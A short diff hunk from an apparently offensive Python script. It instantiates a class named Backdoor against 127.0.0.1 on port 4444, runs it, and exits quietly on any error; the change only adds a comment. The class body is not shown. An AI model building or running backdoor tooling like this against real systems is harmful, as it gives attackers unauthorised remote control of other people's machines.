@@ -87,7 +87,7 @@ class Backdoor:
 
 
 try:
-    my_backdoor = Backdoor("127.0.0.1", 4444)
+    my_backdoor = Backdoor("127.0.0.1", 4444) #depends
     my_backdoor.run()
 except Exception:
     sys.exit();
